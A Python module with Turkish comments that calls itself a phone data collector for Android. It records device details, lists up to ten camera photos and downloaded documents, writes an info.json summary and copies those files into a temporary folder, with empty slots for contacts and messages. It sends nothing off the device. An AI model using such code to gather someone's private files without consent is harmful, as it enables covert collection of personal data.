"""
Telefon verilerini toplama modülü
"""
import os
import json
import shutil
from datetime import datetime
import mimetypes

class DataCollector:
    def __init__(self, base_path=None):
        if base_path is None:
            # Pydroid'de varsayılan depolama yolu
            self.base_path = '/storage/emulated/0'
        else:
            self.base_path = base_path
        
        self.collected_data = {
            'files': [],
            'system_info': {},
            'contacts': [],
            'messages': [],
            'photos': [],
            'documents': []
        }
    
    def get_system_info(self):
        """Sistem bilgilerini topla"""
        import platform
        
        info = {
            'device': platform.node(),
            'system': platform.system(),
            'version': platform.version(),
            'time': datetime.now().isoformat()
        }
        
        # Pydroid özel bilgiler
        try:
            import android
            droid = android.Android()
            
            # Pil bilgisi
            battery = droid.batteryGetLevel()
            info['battery'] = battery.result if battery else 'Bilinmiyor'
            
        except:
            pass
        
        self.collected_data['system_info'] = info
        return info
    
    def collect_photos(self, max_count=10):
        """Fotoğrafları topla (ilk max_count kadar)"""
        dcim_path = os.path.join(self.base_path, 'DCIM/Camera')
        photos = []
        
        if os.path.exists(dcim_path):
            for i, file in enumerate(os.listdir(dcim_path)):
                if i >= max_count:
                    break
                    
                if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                    file_path = os.path.join(dcim_path, file)
                    photos.append({
                        'name': file,
                        'path': file_path,
                        'size': os.path.getsize(file_path),
                        'modified': datetime.fromtimestamp(
                            os.path.getmtime(file_path)
                        ).isoformat()
                    })
        
        self.collected_data['photos'] = photos
        return photos
    
    def collect_documents(self, max_count=10):
        """Dökümanları topla"""
        documents = []
        doc_extensions = ('.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx')
        
        # Downloads klasörünü tara
        downloads_path = os.path.join(self.base_path, 'Download')
        
        if os.path.exists(downloads_path):
            for i, file in enumerate(os.listdir(downloads_path)):
                if i >= max_count:
                    break
                    
                if file.lower().endswith(doc_extensions):
                    file_path = os.path.join(downloads_path, file)
                    documents.append({
                        'name': file,
                        'path': file_path,
                        'size': os.path.getsize(file_path),
                        'type': mimetypes.guess_type(file_path)[0]
                    })
        
        self.collected_data['documents'] = documents
        return documents
    
    def create_info_file(self, output_dir):
        """Bilgi dosyası oluştur"""
        os.makedirs(output_dir, exist_ok=True)
        
        info_file = os.path.join(output_dir, 'info.json')
        with open(info_file, 'w', encoding='utf-8') as f:
            json.dump(self.collected_data, f, indent=2, ensure_ascii=False)
        
        return info_file
    
    def copy_files_to_temp(self, temp_dir):
        """Dosyaları geçici dizine kopyala"""
        os.makedirs(temp_dir, exist_ok=True)
        copied_files = []
        
        # Fotoğrafları kopyala
        for photo in self.collected_data['photos']:
            dest = os.path.join(temp_dir, f"photo_{photo['name']}")
            shutil.copy2(photo['path'], dest)
            copied_files.append(dest)
        
        # Dökümanları kopyala
        for doc in self.collected_data['documents']:
            dest = os.path.join(temp_dir, f"doc_{doc['name']}")
            shutil.copy2(doc['path'], dest)
            copied_files.append(dest)
        
        return copied_files
